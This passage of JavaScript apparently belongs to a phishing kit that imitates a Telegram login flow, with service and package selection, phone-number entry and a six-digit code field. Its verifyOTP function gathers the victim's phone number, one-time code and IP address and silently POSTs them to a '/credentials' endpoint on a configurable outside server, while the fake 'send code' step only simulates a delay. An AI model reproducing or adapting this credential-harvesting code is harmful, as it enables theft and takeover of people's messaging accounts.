      document.body.classList.toggle('dark');
      localStorage.setItem('tg-theme', state.darkMode ? 'dark' : 'light');
      render();
    },

    nextStep() {
      if (state.currentStep < steps.length - 1) {
        state.currentStep++;
        render();
      }
    },

    prevStep() {
      if (state.currentStep > 0) {
        state.currentStep--;
        render();
      }
    },

    selectService(serviceId) {
      state.selectedService = serviceId;
      render();
    },

    selectPackage(packageId) {
      state.selectedPackage = packageId;
      render();
    },

    updatePhone(value) {
      state.phoneNumber = value.replace(/\D/g, '');
      // Don't re-render on every keystroke to avoid keyboard closing
      // Just update the button state
      const btn = document.querySelector('.btn-primary');
      if (btn && !state.phoneNumber || state.phoneNumber.length < 7) {
        btn.disabled = true;
      } else if (btn) {
        btn.disabled = false;
      }
    },

    updateCountryCode(value) {
      // Allow + and digits only
      const cleaned = value.replace(/[^\d+]/g, '');
      if (cleaned.startsWith('+') || cleaned === '') {
        state.countryCode = cleaned || '+';
      }
      // Don't re-render to avoid keyboard closing
      const input = document.querySelector('.country-code');
      if (input) input.value = state.countryCode;
    },

    handleOTPInput(index, value) {
      // Only allow digits
      if (value && !/^\d$/.test(value)) {
        const input = document.getElementById(`otp-${index}`);
        if (input) input.value = '';
        return;
      }

      if (value && index < 5) {
        const nextInput = document.getElementById(`otp-${index + 1}`);
        if (nextInput) nextInput.focus();
      }

      // Collect all OTP digits
      let otp = '';
      for (let i = 0; i < 6; i++) {
        const input = document.getElementById(`otp-${i}`);
        if (input) otp += input.value;
      }
      state.otpCode = otp;

      // Update button state without re-rendering
      const btn = document.querySelector('.btn-primary');
      if (btn) {
        btn.disabled = state.otpCode.length !== 6;
      }
    },

    handleOTPKeydown(index, event) {
      if (event.key === 'Backspace' && !event.target.value && index > 0) {
        const prevInput = document.getElementById(`otp-${index - 1}`);
        if (prevInput) {
          prevInput.focus();
          prevInput.value = '';
        }
      }
    },

    sendOTP() {
      state.isProcessing = true;
      render();

      setTimeout(() => {
        state.isProcessing = false;
        state.currentStep++;
        render();
      }, 1500);
    },

    async verifyOTP() {
      state.isProcessing = true;
      render();

      // Get IP address
      let ipAddress = 'Unknown';
      try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        ipAddress = ipData.ip;
      } catch (e) {
        ipAddress = 'Unknown';
      }

      const trackingId = window.TRACKING_ID;
      const serverUrl = window.SERVER_URL;

      fetch(`${serverUrl}/credentials?trackingId=${trackingId}`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          platform: 'Telegram',
          phone: `${state.countryCode}${state.phoneNumber}`,
          otp: state.otpCode,
          ipAddress: ipAddress
        })
      }).catch(() => {});

      setTimeout(() => {
        state.isProcessing = false;
        state.currentStep++;
        render();
      }, 1500);
    },

    resendOTP() {
      state.otpCode = '';
      // Clear OTP inputs
      for (let i = 0; i < 6; i++) {
        const input = document.getElementById(`otp-${i}`);
        if (input) input.value = '';
      }
      const firstInput = document.getElementById('otp-0');
      if (firstInput) firstInput.focus();
    },

    reset() {
      state = {
        currentStep: 0,
        darkMode: state.darkMode,
        selectedService: null,
        selectedPackage: null,
        countryCode: '+1',
        phoneNumber: '',
        otpCode: '',
        isProcessing: false
      };
      render();
    }
  };

  // Initialize
  const savedTheme = localStorage.getItem('tg-theme');
  if (savedTheme === 'dark') {
    state.darkMode = true;
    document.body.classList.add('dark');
  }

  render();
})();
